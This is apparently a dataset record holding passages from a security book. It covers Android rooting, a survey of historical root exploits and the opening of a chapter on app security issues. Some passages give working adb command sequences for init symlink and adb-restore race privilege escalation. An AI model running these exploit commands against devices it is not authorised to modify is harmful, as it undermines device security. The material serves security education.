or engineering HBOOT that\ndoes not enforce NAND locking. In both cases, the boot loader displays a security\noff message (S-OFF). Figure 3-3 shows a locked and unlocked HTC HBOOT.\nFigure 3-3: Locked and Unlocked HTC HBOOT\nBefore HTC provided the offi cial boot loader unlock procedure in August 2011,\na patched HBOOT was the only solution available. This could be accomplished\non some devices by unoffi cial boot loader unlock tools such as AlphaRev (avail-\nable at http://alpharev.nl/) and Unrevoked (available at http://unrevoked\n.com/), which later merged into the Revolutionary.io tool (available at http://\nrevolutionary.io/). Those tools usually combine multiple public or private\nexploits to be able to fl ash the patched boot loader and bypass NAND locks. In\nmost cases, refl ashing a stock HBOOT re-enables the device security fl ag (S-ON).\nThe Unlimited.io exploits available at http://unlimited.io/, such as\nJuopunutBear, LazyPanda, and DirtyRacun, allow gaining full radio S-OFF on\nc03.indd 12:15:57:PM 03/04/2014 Page 70\nChapter 3 ■ Rooting Your Device 71\nsome devices by combining several exploits present in HTC’s Android ROMs\nand the device’s baseband.\nIn December 2010, Scott Walker published the gfree exploit available at https://\ngithub.com/tmzt/g2root-kmod/tree/master/scotty2/gfree under the GPL3\nlicense. This exploit disabled the embedded MultiMediaCard (eMMC) protection\nof the T-Mobile G2. The eMMC memory, which holds the baseband partition,\nis booted in read-only mode when the bootloader initializes the hardware. The\nexploit then power-cycles the eMMC chip by using a Linux kernel module and\nsets the @secuflag to false. Finally, it installs a MultiMediaCard (MMC) block\nrequest fi lter in the kernel to remove the write protection on the hidden radio\nsettings partition.\nWhen HTC started its offi cial unlock portal, it provided HBOOT images for\nsome devices which allow the user to unlock the boot loader—and remove\nNAND locks—in two steps:\n1. First the user should run the command fastboot oem get_identifier_\ntoken. The boot loader displays a blob that the user should submit to\nHTC’s unlock portal.\n2. After submitting the identifi er token, the user receives an Unlock_code\n.bin fi le unique for his phone. This fi le is signed with HTC’s private key\nand should be fl ashed to the device using the command fastboot flash\nunlocktoken Unlock_code.bin.\nIf the Unlock_code.bin fi le is valid, the phone allows using the standard\nfastboot flash commands to fl ash unsigned partition images. Further, it\nenables booting such unsigned partition images without restrictions. Figure\n3-4 depicts the general workfl ow for unlocking devices. HTC and Motorola are\ntwo OEMs that utilize this type of process.\nOther devices, such as some Toshiba tablets, also have NAND locks. For\nthose devices, the locks are enforced by the sealime Loadable Kernel Module,\nwhich resides in the boot image initrd. This module is based on SEAndroid and\nprevents remounting the system partition for writing.\nPersisting a Soft Root\nWhen you have a root shell (soft root), achieving permanent root access is\nstraightforward. On phones without NAND locks, you only need write access\nto the system partition. If the phone has a NAND lock, it should be removed\nfi rst (refer to the “NAND Locks, Temporary Root, and Permanent Root” section\nearlier in this chapter).\nWith NAND locks out of the picture, you can simply remount the system\npartition in read/write mode, place an su binary with set-uid root permissions,\nand remount it in read-only mode again; optionally, you can install an su wrap-\nper such as SuperUser or SuperSU.\nc03.indd 12:15:57:PM 03/04/2014 Page 71\n72 Chapter 3 ■ Rooting Your Device\nBoot Loader Unlock Portal Boot Loader\nLocked Device Unlocked\nStep 1 Step 2 Step 3 Step 4\nUser gets the phone’s User submits the The unlock portal The user unlock the\nunlock token using unlock token token to validates the device using the\nfastboot the OEM unlock portal token and sends provided unlock key\nthe unlock key and fastboot\nUSER\nFigure 3-4: General boot loader unlock workflow\nA typical way of automating the process just described is by running the\nfollowing commands from a host computer connected to an Android device\nwith USB debugging enabled:\nadb shell mount -o remount,rw /system\nadb adb push su /system/xbin/su\nadb shell chown 0.0 /system/xbin/su\nadb shell chmod 06755 /system/xbin/su\nadb shell mount -o remount,ro /system\nadb install Superuser.apk\nAnother way of retaining persistent root access is by writing a custom recovery\ninto the recovery partition using the dd command on the Android device. This\nis equivalent to fl ashing a custom recovery via fastboot or download mode, as\ndescribed in the “Rooting with an Unlocked Boot Loader” section earlier in\nthis chapter.\nFirst, you need to identify the location of the recovery partition on the device.\nFor example:\nshell@android:/ # ls -l /dev/block/platform/*/by-name/recovery\nlrwxrwxrwx root root 2012-11-20 14:53 recovery -> /dev/block/mmcblk0p7\nThe preceding output shows the recovery partition in this case is located at\n/dev/block/mmcblk0p7.\nc03.indd 12:15:57:PM 03/04/2014 Page 72\nChapter 3 ■ Rooting Your Device 73\nYou can now push a custom recovery image onto the SD card and write it to\nthe recovery partition:\nadb shell push custom-recovery.img /sdcard/\nadb shell dd if=/sdcard/custom-recovery.img of=/dev/block/mmcblk0p7\nFinally, you need to reboot into the custom recovery and apply the su update\npackage.\nadb reboot recovery\nHistory of Known Attacks\nThe remainder of this section discusses numerous previously known methods\nfor gaining root access to Android devices. By presenting these issues, we hope\nto provide insight into the possible ways you can gain root access to Android\ndevices. Although a few of these issues affect the larger Linux ecosystem, most\nare Android specifi c. Many of these issues cannot be exploited without access\nto the ADB shell. In each case we discuss the root cause of the vulnerability and\nkey details of how the exploit leveraged it.\nNOTE The astute reader may notice that several of the following issues were\nunknowingly discovered by multiple, separate parties. Although this is not a common\noccurrence, it does happen from time to time.\nSome of the exploitation details provided in this section are rather technical.\nIf they are overwhelming, or you are already intimately familiar with the inner\nworkings of these exploits, feel free to skip past them. In any case, this section\nserves to document these exploits in moderate detail. Chapter 8 covers a few of\nthese exploits in more detail.\nKernel: Wunderbar/asroot\nThis bug was discovered by Tavis Ormandy and Julien Tinnes of the Google\nSecurity Team and was assigned CVE-2009-2692:\nThe Linux kernel 2.6.0 through 2.6.30.4 and 2.4.4 through 2.4.37.4, does\nnot initialize all function pointers for socket operations in proto_ops struc-\ntures, which allows local users to trigger a NULL pointer dereference and\ngain privileges by using mmap to map page zero, placing arbitrary code on\nthis page, and then invoking an unavailable operation, as demonstrated by\nthe sendpage operation (sock_sendpage function) on a PF_PPPOX socket.\nc03.indd 12:15:57:PM 03/04/2014 Page 73\n74 Chapter 3 ■ Rooting Your Device\nBrad Spengler (spender) wrote the Wunderbar emporium exploit for x86/\nx86_64, which is where this bug got its famous name. However, the exploit for\nAndroid (Linux on the ARM architecture) was released by Christopher Lais\n(Zinx), is named asroot, and is published at http://g1files.webs.com/Zinx\n/android-root-20090816.tar.gz. This exploit worked on all Android versions\nthat used a vulnerable kernel.\nThe asroot exploit introduces a new “.NULL” section at address 0 with the exact\nsize of a page. This section contains code that sets the current user identifi er\n(UID) and group identifi er (GID) to root. Next, the exploit calls sendfile to cause\na sendpage operation on a PF _BLUETOOTH socket with missing initialization\nof the proto _ops structure. This causes the code in the “.NULL” section to be\nexecuted in kernel mode, yielding a root shell.\nRecovery: Volez\nA typographical error in the signature verifi er used in Android 2.0 and 2.0.1\nrecovery images caused the recovery to incorrectly detect the End of Central\nDirectory (EOCD) record inside a signed update zip fi le. This issue resulted in\nthe ability to modify the contents of a signed OTA recovery package.\nThe signature verifi er error was spotted by Mike Baker ([mbm]) and it was\nabused to root the Motorola Droid when the fi rst offi cial OTA package was\nreleased. By creating a specially crafted zip fi le, it was possible to inject an su\nbinary into the signed OTA zip fi le. Later, Christopher Lais (Zinx) wrote Volez,\na utility for creating customized update zip fi les out of a valid signed update\nzip, which is available at http://zenthought.org/content/project/volez.\nUdev: Exploid\nThis vulnerability affected all Android versions up to 2.1. It was originally\ndiscovered as a vulnerability in the udev daemon used on x86 Linux systems.\nIt was assigned CVE-2009-1185. Later, Google reintroduced the issue in the init\ndaemon, which handles the udev functionality in Android.\nThe exploit relies on udev code failing to verify the origin of a NETLINK\nmessage. This failure allows a user-space process to gain privileges by send-\ning a udev event claiming to originate from the kernel, which was trusted. The\noriginal Exploid exploit released by Sebastian Krahmer (“The Android Exploid\nCrew”) had to be run from a writable and executable directory on the device.\nFirst, the exploit created a socket with a domain of PF_NETLINK and a fam-\nily of NETLINK _KOBJECT _UEVENT (kernel message to user-space event).\nSecond, it created a fi le hotplug in the current directory, containing the path to\nthe exploid binary. Third, it created a symbolic link called data in the current\nc03.indd 12:15:57:PM 03/04/2014 Page 74\nChapter 3 ■ Rooting Your Device 75\ndirectory, pointing to /proc/sys/kernel/hotplug. Finally, it sent a spoofed\nmessage to the NETLINK socket.\nWhen init received this message, and failed to validate its origin, it pro-\nceeded to copy the contents of the hotplug fi le to the fi le data. It did this with\nroot privileges. When the next hotplug event occurred (such as disconnecting\nand reconnecting the Wi-Fi interface), the kernel executed the exploid binary\nwith root privileges.\nAt this point, the exploit code detected it was running with root privileges.\nIt proceeded to remount the system partition in read/write mode and created\na set-uid root shell as /system/bin/rootshell.\nAdbd: RageAgainstTheCage\nAs discussed in the “Abusing adbd to Get Root” section, the ADB daemon (adbd\nprocess) starts running as root and drops privileges to the shell user. In Android\nversions up to 2.2, the ADB daemon did not check the return value of the setuid\ncall when dropping privileges. Sebastian Krahmer used this missing check in\nadbd to create the RageAgainstTheCage exploit available at http://stealth\n.openwall.net/xSports/RageAgainstTheCage.tgz.\nThe exploit has to be run through the ADB shell (under the shell UID). Basically,\nit forks processes until the fork call fails, meaning that the limit of process for\nthat user has been reached. This is a kernel-enforced hard limit called RLIMIT _\nNPROC, which specifi es the maximum number of processes (or threads) that\ncan be created for the real UID of the calling process. At this point, the exploit\nkills adbd, causing it to restart (as root again). Unfortunately, this time adbd\ncan’t drop privileges to shell because the process limit has been reached for\nthat user. The setuid call fails, adbd doesn’t detect this failure, and therefore\ncontinues running with root privileges. Once successful, adbd provides a root\nshell through adb shell command.\nZygote: Zimperlich and Zysploit\nRecall from Chapter 2 that all Android applications start by being forked from\nthe Zygote process. As you might guess, the zygote process runs as root. After\nforking, the new process drops its privileges to the UID of the target application\nusing the setuid call.\nVery similar to RageAgainstTheCage, the Zygote process in Android versions\nup to 2.2 failed to check the return value of the call to setuid when dropping\nprivileges. Again, after exhausting the maximum number of processes for the\napplication’s UID, zygote fails to lower its privileges and launches the applica-\ntion as root.\nc03.indd 12:15:57:PM 03/04/2014 Page 75\n76 Chapter 3 ■ Rooting Your Device\nThis vulnerability was exploited by Joshua Wise in early releases of the\nUnrevoked unlock tool. Later, when Sebastian Krahmer made the Zimperlich\nexploit sources public at http://c-skills.blogspot.com.es/2011/02/\nzimperlich-sources.html, Joshua Wise decided to open source his Zysploit\nimplementation too, available at https://github.com/unrevoked/zysploit.\nAshmem: KillingInTheNameOf and psneuter\nThe Android Shared Memory (ashmem) subsystem is a shared memory alloca-\ntor. It is similar to POSIX Shared Memory (SHM), but with different behavior\nand a simpler fi le-based application programming interface (API). The shared\nmemory can be accessed via mmap or fi le I/O.\nTwo popular root exploits used a vulnerability in the ashmem implementation\nof Android versions prior to 2.3. In affected versions, ashmem allowed any user\nto remap shared memory belonging to the init process. This shared memory\ncontained the system properties address space, which is a critical global data\nstore for the Android operating system. This vulnerability has the Common\nVulnerabilities and Exposures (CVE) identifi er CVE-2011-1149.\nThe KillingInTheNameOf exploit by Sebastian Krahmer remapped the sys-\ntem properties space to be writable and set the ro.secure property to 0. After\nrebooting or restarting adbd, the change in the ro.secure property enabled\nroot access through the ADB shell. You can download the exploit from http://\nc-skills.blogspot.com.es/2011/01/adb-trickery-again.html.\nThe psneuter exploit by Scott Walker (scotty2), used the same vulnerability\nto restrict permissions to the system properties space. By doing so, adbd could\nnot read the value of the ro.secure property to determine whether or not to\ndrop privileges to the shell user. Unable to determine the value of ro.secure,\nit assumed that ro.secure value was 0 and didn’t drop privileges. Again, this\nenabled root access through the ADB shell. You can download psneuter at\nhttps://github.com/tmzt/g2root-kmod/tree/scotty2/scotty2/psneuter.\nVold: GingerBreak\nThis vulnerability has been assigned CVE-2011-1823 and was fi rst demonstrated\nby Sebastian Krahmer in the GingerBreak exploit, available at http://c-skills\n.blogspot.com.es/2011/04/yummy-yummy-gingerbreak.html.\nThe volume manager daemon (vold) on Android 3.0 and 2.x before 2.3.4\ntrusts messages that are received from a PF_NETLINK socket, which allows\nexecuting arbitrary code with root privileges via a negative index that\nbypasses a maximum-only signed integer check.\nc03.indd 12:15:57:PM 03/04/2014 Page 76\nChapter 3 ■ Rooting Your Device 77\nPrior to triggering the vulnerability, the exploit collects various information\nfrom the system. First, it opens /proc/net/netlink and extracts the process iden-\ntifi er (PID) of the vold process. It then inspects the system’s C library (libc.so)\nto fi nd the system and strcmp symbol addresses. Next, it parses the Executable\nand Linkable Format (ELF) header of the vold executable to locate the Global\nOffset Table (GOT) section. It then parses the vold.fstab fi le to fi nd the device’s\n/sdcard mount point. Finally, in order to discover the correct negative index\nvalue, it intentionally crashes the service while monitoring logcat output.\nAfter collecting information, the exploit triggers the vulnerability by sending\nmalicious NETLINK messages with the calculated negative index value. This\ncauses vold to change entries in its own GOT to point to the system function.\nAfter one of the targeted GOT entries is overwritten, vold ends up executing\nthe GingerBreak binary with root privileges.\nWhen the exploit binary detects that it has been executed with root privileges,\nit launches the fi nal stage. Here, the exploit fi rst remounts /data to remove the\nnosuid fl ag. Then it makes /data/local/tmp/sh set-uid root. Finally, it exits the\nnew process (running as root) and executes the newly created set-uid root shell\nfrom the original exploit process.\nA more detailed case study of this vulnerability is provided in the “GingerBreak”\nsection of Chapter 8.\nPowerVR: levitator\nIn October 2011, Jon Larimer and Jon Oberheide released the levitator exploit at\nhttp://jon.oberheide.org/files/levitator.c. This exploit uses two distinct\nvulnerabilities that affect Android devices with the PowerVR SGX chipset. The\nPowerVR driver in Android versions up to 2.3.5 specifi cally contained the fol-\nlowing issues.\nCVE-2011-1350: The PowerVR driver fails to validate the length parameter\nprovided when returning a response data to user mode from an ioctl sys-\ntem call, causing it to leak the contents of up to 1MB of kernel memory.\nCVE-2011-1352: A kernel memory corruption vulnerability that leads any\nuser with access to /dev/pvrsrvkm to have write access to the previous\nleaked memory.\nThe levitator exploit takes advantage of these two vulnerabilities to surgically\ncorrupt kernel memory. After achieving privilege escalation, it spawns a shell.\nA more detailed case study of this vulnerability is provided in Chapter 10.\nc03.indd 12:15:57:PM 03/04/2014 Page 77\n78 Chapter 3 ■ Rooting Your Device\nLibsysutils: zergRush\nThe Revolutionary team released the popular zergRush exploit in October 2011;\nsources are available at https://github.com/revolutionary/zergRush. The\nvulnerability exploited was assigned CVE-2011-3874, as follows:\nStack-based buffer overflow in libsysutils in Android 2.2.x through 2.2.2\nand 2.3.x through 2.3.6 allows user-assisted remote attackers to execute\narbitrary code via an application that calls the FrameworkListener::\ndispatchCommand method with the wrong number of arguments, as\ndemonstrated by zergRush to trigger a use-after-free error.\nThe exploit uses the Volume Manager daemon to trigger the vulnerability,\nas it is linked against the libsysutils.so library and runs as root. Because the\nstack is non-executable, the exploit constructs a Return Oriented Programming\n(ROP) chain using gadgets from libc.so library. It then sends vold a specially\ncrafted FrameworkCommand object, making the RunCommand point to the exploit’s\nROP payload. This executes the payload with root privileges, which drops a root\nshell and changes the ro.kernel.qemu property to 1. As mentioned previously,\nthis causes ADB to restart with root privileges.\nA more detailed case study of this vulnerability is provided in Chapter 8.\nKernel: mempodroid\nThe vulnerability was discovered by Jüri Aedla, and was assigned CVE identi-\nfi er CVE-2012-0056:\nThe mem_write function in Linux kernel 2.6.39 and other versions, when\nASLR is disabled, does not properly check permissions when writing to /\nproc/<pid>/mem, which allows local users to gain privileges by modifying\nprocess memory, as demonstrated by Mempodipper.\nThe /proc/<pid>/mem proc fi le system entry is an interface that can be used\nto access the pages of a process’s memory through POSIX fi le operations such\nas open, read, and lseek. In kernel version 2.6.39, the protections to access other\nprocesses memory were mistakenly removed.\nJay Freeman (saurik) wrote the mempodroid exploit for Android based on\na previous Linux exploit, mempodipper, by Jason A. Donenfeld (zx2c4). The\nmempodroid exploit uses this vulnerability to write directly to the code seg-\nment of the run-as program. This binary, used to run commands as a specifi c\napplication UID, runs set-uid root on stock Android. Because run-as is statically\nlinked on Android, the exploit needs the address in memory of the setresuid\ncall and the exit function, so that the payload can be placed exactly at the right\nc03.indd 12:15:57:PM 03/04/2014 Page 78\nChapter 3 ■ Rooting Your Device 79\nplace. Sources for the mempodroid exploit are available at https://github.\ncom/saurik/mempodroid.\nA more detailed case study of this vulnerability is provided in Chapter 8.\nFile Permission and Symbolic Link–Related Attacks\nThere are plenty of fi le permission and symbolic link–related attacks present in\na range of devices. Most of them are introduced by custom OEM modifi cations\nthat are not present in stock Android. Dan Rosenberg has discovered many of\nthese bugs and has provided very creative root methods for a comprehensive\nlist of devices in his blog at http://vulnfactory.org/blog/.\nInitial versions of Android 4.0 had a bug in the init functions for do_chmod,\nmkdir, and do_chown that applied the ownership and fi le permissions specifi ed\neven if the last element of their target path was a symbolic link. Some Android\ndevices have the following line in their init.rc script.\nmkdir /data/local/tmp 0771 shell shell\nAs you can guess now, if the /data/local folder is writeable by the user or\ngroup shell, you can exploit this fl aw to make the /data folder writeable by\nreplacing /data/local/tmp with a symbolic link to /data and rebooting the\ndevice. After rebooting, you can create or modify the /data/local.prop fi le to\nset the property ro.kernel.qemu to 1.\nThe commands to exploit this fl aw are as follows:\nadb shell rm -r /data/local/tmp\nadb shell ln -s /data/ /data/local/tmp\nadb reboot\nadb shell \"echo 'ro.kernel.qemu=1' > /data/local.prop\"\nadb reboot\nAnother popular variant of this vulnerability links /data/local/tmp to the\nsystem partition and then uses debugfs to write the su binary and make it set-\nuid root. For example, the ASUS Transformer Prime running Android 4.0.3 is\nvulnerable to this variant.\nThe init scripts in Android 4.2 apply O _NOFOLLOW semantics to prevent\nthis class of symbolic link attacks.\nAdb Restore Race Condition\nAndroid 4.0 introduced the ability to do full device backups through the adb\nbackup command. This command backs up all data and applications into the\nfi le backup.ab, which is a compressed TAR fi le with a prepended header. The\nadb restore command is used to restore the data.\nThere were two security issues in the initial implementation of the restore\nprocess that were fi xed in Android 4.1.1. The fi rst issue allowed creating fi les and\nc03.indd 12:15:57:PM 03/04/2014 Page 79\n80 Chapter 3 ■ Rooting Your Device\ndirectories accessible by other applications. The second issue allowed restoring\nfi le sets from packages that run under a special UID, such as system, without a\nspecial backup agent to handle the restore process.\nTo exploit these issues, Andreas Makris (Bin4ry) created a specially crafted\nbackup fi le with a world readable/writeable/executable directory containing\n100 fi les with the content ro.kernel.qemu=1 and ro.secure=0 inside it. When\nthe contents of this fi le are written to /data/local.prop, it makes adbd run\nwith root privileges on boot. The original exploit can be downloaded at http://\nforum.xda-developers.com/showthread.php?t=1886460.\nThe following one-liner, if executed while the adb restore command is run-\nning, causes a race between the restore process in the backup manager service\nand the while loop run by the shell user:\nadb shell \"while ! ln -s /data/local.prop \\\n/data/data/com.android.settings/a/file99; do :; done\"\nIf the loop creates the symbolic link in file99 before the restore process restores\nit, the restore process follows the symbolic link and writes the read-only system\nproperties to /data/local.prop, making adbd run as root in the next reboot.\nExynos4: exynos-abuse\nThis vulnerability exists in a Samsung kernel driver and affects devices\nwith an Exynos 4 processor. Basically, any application can access the /dev\n/exynosmem device fi le, which allows mapping all physical RAM with read and\nwrite permissions.\nThe vulnerability was discovered by alephzain, who wrote the exynos-\nabuse exploit to demonstrate it and reported it on XDA-developers forums. The\noriginal post is available at http://forum.xda-developers.com/showthread\n.php?t=2048511.\nFirst, the exploit maps kernel memory and changes the format string for the\nfunction handling /proc/kallsyms in order to avoid the kptr_restrict kernel miti-\ngation. Then it parses /proc/kallsyms to fi nd the address of the sys_setresuid\nsystem call handler function. Once found, it patches the function to remove\na permission check and executes the setresuid system call in user space to\nbecome root. Finally, it reverses the changes it made to kernel memory and\nexecutes a root shell.\nLater, alephzain created a one-click rooting application called Framaroot.\nFramaroot embeds three variants of the original bug, which each allows unprivi-\nleged users to map arbitrary physical memory. This application works on devices\nbased on the Exynos4 chipset and as well as devices based on the TI OMAP3\nchipset. Most notably, alephzain discovered that Samsung did not properly fi x\nc03.indd 12:15:57:PM 03/04/2014 Page 80\nChapter 3 ■ Rooting Your Device 81\nthe Exynos4 issue. He embedded a new exploit in Framaroot that exploits an\ninteger overfl ow present in the Samsung fi x. This allows bypassing the additional\nvalidation and again enables overwriting kernel memory. These new exploits\nwere silently included in Farmaroot by alephzain and later uncovered and\ndocumented by Dan Rosenberg at http://blog.azimuthsecurity.com/2013/02/\nre-visiting-exynos-memory-mapping-bug.html.\nDiag: lit / diaggetroot\nThis vulnerability was discovered by giantpune and was assigned CVE identi-\nfi er CVE-2012-4220:\ndiagchar_core.c in the Qualcomm Innovation Center (QuIC) Diagnostics\n(aka DIAG) kernel-mode driver for Android 2.3 through 4.2 allows attack-\ners to execute arbitrary code or cause a denial of service (incorrect pointer\ndereference) via an application that uses crafted arguments in a local\ndiagchar_ioctl call.\nThe lit exploit used this vulnerability to cause the kernel to execute native\ncode from user-space memory. By reading from the /sys/class/leds/\nlcd-backlight/reg fi le, it was possible to cause the kernel to process data\nstructures in user-space memory. During this processing, it called a function\npointer from one of the structures, leading to privilege escalation.\nThe diaggetroot exploit, for the HTC J Butterfl y device, also used this vulner-\nability. However, on that device, the vulnerable character device is only acces-\nsible by user or group radio. To overcome this situation, the researcher abused\na content provider to obtain an open fi le descriptor to the device. Gaining\nroot using this method was only possible with the combination of the two\ntechniques. You can download the exploit code at https://docs.google.com/\nfile/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1.\nSummary\nR ooting an Android device gives you full control over the Android system.\nHowever, if you don’t take any precautions to fi x the open paths to gain root\naccess, the system security can be easily compromised by an attacker.\nThis chapter described the key concepts to understand the rooting process. It\nwent through legitimate boot loader unlock methods, such as the ones present\nin devices with an unlocked boot loader, as well as other methods that allow\ngaining and persisting root access on a device with a locked boot loader. Finally,\nc03.indd 12:15:57:PM 03/04/2014 Page 81\n82 Chapter 3 ■ Rooting Your Device\nyou saw an overview of the most famous root exploits that have been used dur-\ning the past decade to root many Android devices.\nThe next chapter dives into Android application security. It covers common\nsecurity issues affecting Android applications and demonstrates how to use\nfree, public tools to perform application security assessments.\nc03.indd 12:15:57:PM 03/04/2014 Page 82"
  },
  {
    "input": "",
    "summary": "This chapter examines common Android application security issues, such as improper permission handling, insecure data transmission/storage, and vulnerable IPC endpoints, using case studies to demonstrate how these flaws can be discovered and exploited. It highlights the importance of static and dynamic analysis tools in identifying risks like sensitive data leaks, misconfigured permissions, and insecure communication practices.",
    "output": "CHAPTER\n4\nReviewing Application Security\nApplication security has been a hot-button topic since even before Android\nexisted. During the onset of the web application craze, developers fl ocked to\nquickly develop applications, overlooking basic security practices or using\nframeworks without adequate security controls. With the advent of mobile\napplications, that very same cycle is repeating. This chapter begins by discuss-\ning some common security issues in Android applications. It concludes with\ntwo case studies demonstrating discovery and exploitation of application fl aws\nusing common tools.\nCommon Issues\nWith traditional application security, there are numerous issues that crop up\nrepeatedly in security assessment and vulnerability reports. Types of issues\nrange from sensitive information leaks to critical code or command execution\nvulnerabilities. Android applications aren’t immune to these fl aws, although\nthe vectors to reach those fl aws may differ from traditional applications.\nThis section covers some of the security issues typically found during Android\napp security testing engagements and public research. This is certainly not an\nexhaustive list. As secure app development practices become more common-\nplace, and Android’s own application programming interfaces (APIs) evolve,\n83\nc04.indd 01:15:7:PM 02/24/2014 Page 83\n84 Chapter 4 ■ Reviewing Application Security\nit is likely that other fl aws—perhaps even new classes of issues—will come to\nthe forefront.\nApp Permission Issues\nGiven the granularity of the Android permission model, there is an opportunity\nfor developers to request more permissions for their app than may be required.\nThis behavior may be due in part to inconsistencies in permission enforcement\nand documentation. Although the developer reference docs describe most of the\npermission requirements for given classes and methods, they’re not 100 percent\ncomplete or 100 percent accurate. Research teams have attempted to identify\nsome of these inconsistencies in various ways. For example, in 2012, researchers\nAndrew Reiter and Zach Lanier attempted to map out the permission require-\nments for the Android API available in Android Open Source Project (AOSP).\nThis led to some interesting conclusions about these gaps.\nAmong some of the fi ndings in this mapping effort, they discovered incon-\nsistencies between documentation and implementation for some methods in\nthe WiFiManager class. For example, the developer documentation does not\nmention permission requirements for the startScan method. Figure 4-1 shows\na screenshot of the Android development documentation of this method.\nFigure 4-1: Documentation for startScan\nThis differs from the actual source code for this method (in Android 4.2),\nwhich indicates a call to enforceCallingOrSelfPermission, which checks\nto see if the caller bears the ACCESS_WIFI_STATE permission by way of\nenforceChangePermission:\npublic void startScan(boolean forceActive) {\nenforceChangePermission();\nmWifiStateMachine.startScan(forceActive);\nnoteScanStart();\n}\n...\nprivate void enforceChangePermission() {\nmContext.enforceCallingOrSelfPermission(android.Manifest.\npermission.CHANGE_WIFI_STATE,\n\"WifiService\");\n}\nc04.indd 01:15:7:PM 02/24/2014 Page 84\nChapter 4 ■ Reviewing Application Security 85\nAnother example is the getNeighboringCellInfo method in the\nTelephonyManager class, whose documentation specifi es a required permis-\nsion of ACCESS_COARSE_UPDATES. Figure 4-2 shows a screenshot of the Android\ndevelopment documentation for this method.\nFigure 4-2: Documentation for getNeighboringCellInfo\nHowever, if you look through the source code of the PhoneInterfaceManager\nclass (in Android 4.2), which implements the Telephony interface, you see the\ngetNeighboringCellInfo method actually checks for the presence of the ACCESS_\nFINE_LOCATION or ACCESS_COARSE_LOCATION permissions—neither of which are\nthe nonexistent, invalid permission specifi ed in the documentation:\npublic List<NeighboringCellInfo> getNeighboringCellInfo() {\ntry {\nmApp.enforceCallingOrSelfPermission(\nandroid.Manifest.permission.ACCESS_FINE_LOCATION,\nnull);\n} catch (SecurityException e) {\n// If we have ACCESS_FINE_LOCATION permission, skip the check\n// for ACCESS_COARSE_LOCATION\n// A failure should throw the SecurityException from\n// ACCESS_COARSE_LOCATION since this is the weaker precondition\nmApp.enforceCallingOrSelfPermission(\nandroid.Manifest.permission.ACCESS_COARSE_LOCATION, null);\n}\nThese kinds of oversights, while perhaps seemingly innocuous, often lead to\nbad practices on the part of developers, namely undergranting or, worse, overgrant-\ning of permissions. In the case of undergranting, it’s often a reliability or func-\ntionality issue, as an unhandled SecurityException leads to the app crashing.\nAs for overgranting, it’s more a security issue; imagine a buggy, overprivileged\napp exploited by a malicious app, effectively leading to privilege escalation.\nFor more information on the permission mapping research, see\nwww.slideshare.net/quineslideshare/mapping-and-evolution-of-android-\npermissions.\nWhen analyzing Android applications for excessive permissions, it’s important\nto compare what permissions are requested to what the application’s purpose\nreally is. Certain permissions, such as CAMERA and SEND_SMS, might be excessive\nfor a third-party app. For these, the desired functionality can be achieved by\ndeferring to the Camera or Messaging applications, and letting them handle\nc04.indd 01:15:7:PM 02/24/2014 Page 85\n86 Chapter 4 ■ Reviewing Application Security\nthe task (with the added safety of user intervention). The “Mobile Security\nApp” case study later in the chapter demonstrates how to identify where in the\napplication’s components those permissions are actually exercised.\nInsecure Transmission of Sensitive Data\nBecause it receives constant scrutiny, the overall idea of transport security (for\nexample, SSL, TLS, and so on) is generally well understood. Unfortunately, this\ndoesn’t always apply in the mobile application world. Perhaps due to a lack of\nunderstanding about how to properly implement SSL or TLS, or just the incorrect\nnotion that “if it’s over the carrier’s network, it’s safe,” mobile app developers\nsometimes fail to protect sensitive data in transit.\nThis issue tends to manifest in one or more of the following ways:\n■ Weak encryption or lack of encryption\n■ Strong encryption, but lack of regard for security warnings or certifi cate\nvalidation errors\n■ Use of plain text after failures\n■ Inconsistent use of transport security per network type (for example, cell\nversus Wi-Fi)\nDiscovering insecure transmission issues can be as simple as capturing traffi c\nsent from the target device. Details on building a man-in-the-middle rig are out-\nside the scope of this book, but numerous tools and tutorials exist for facilitating\nthis task. In a pinch, the Android emulator supports both proxying of traffi c as\nwell as dumping traffi c to a PCAP-format packet trace. You can achieve this by\npassing the -http-proxy or -tcpdump options, respectively.\nA prominent public example of insecure data transmission was in the imple-\nmentation of Google ClientLogin authentication protocol in certain components\nof Android 2.1 through 2.3.4. This protocol allows for applications to request an\nauthentication token for the user’s Google account, which can then be reused\nfor subsequent transactions against a given service’s API.\nIn 2011, University of Ulm researchers found that the Calendar and Contacts\napps on Android 2.1 through 2.3.3 and the Picasa Sync service on Android 2.3.4\nsent the Google ClientLogin authentication token over plaintext HTTP. After\nan attacker obtained this token, it could be reused to impersonate the user. As\nnumerous tools and techniques exist for conducting man-in-the-middle attacks\non Wi-Fi networks, interception of this token would be easy—and would spell\nbad news for a user on a hostile or untrusted Wi-Fi network.\nFor more information on the University of Ulm’s Google ClientLogin fi ndings,\nsee www.uni-ulm.de/en/in/mi/staff/koenings/catching-authtokens.html.\nc04.indd 01:15:7:PM 02/24/2014 Page 86\nChapter 4 ■ Reviewing Application Security 87\nInsecure Data Storage\nAndroid offers multiple standard facilities for data storage—namely Shared\nPreferences, SQLite databases, and plain old fi les. Furthermore, each of these\nstorage types can be created and accessed in various ways, including managed\nand native code, or through structured interfaces like Content Providers. The\nmost common mistakes include plaintext storage of sensitive data, unprotected\nContent Providers (discussed later), and insecure fi le permissions.\nOne cohesive example of both plaintext storage and insecure fi le permissions\nis the Skype client for Android, which was found to have these problems in\nApril 2011. Reported by Justin Case (jcase) via http://AndroidPolice.com, the\nSkype app created numerous fi les, such as SQLite databases and XML fi les, with\nworld-readable and world-writable permissions. Furthermore, the content was\nunencrypted and included confi guration data and IM logs. The following out-\nput shows jcase’s own Skype app data directory, as well as partial fi le contents:\n# ls -l /data/data/com.skype.merlin_mecha/files/jcaseap\n-rw-rw-rw- app_152 app_152 331776 2011-04-13 00:08 main.db\n-rw-rw-rw- app_152 app_152 119528 2011-04-13 00:08 main.db-journal\n-rw-rw-rw- app_152 app_152 40960 2011-04-11 14:05 keyval.db\n-rw-rw-rw- app_152 app_152 3522 2011-04-12 23:39 config.xml\ndrwxrwxrwx app_152 app_152 2011-04-11 14:05 voicemail\n-rw-rw-rw- app_152 app_152 0 2011-04-11 14:05 config.lck\n-rw-rw-rw- app_152 app_152 61440 2011-04-13 00:08 bistats.db\ndrwxrwxrwx app_152 app_152 2011-04-12 21:49 chatsync\n-rw-rw-rw- app_152 app_152 12824 2011-04-11 14:05 keyval.db-journal\n-rw-rw-rw- app_152 app_152 33344 2011-04-13 00:08 bistats.db-journal\n# grep Default /data/data/com.skype.merlin_mecha/files/shared.xml\n<Default>jcaseap</Default>\nThe plaintext storage aspect aside, the 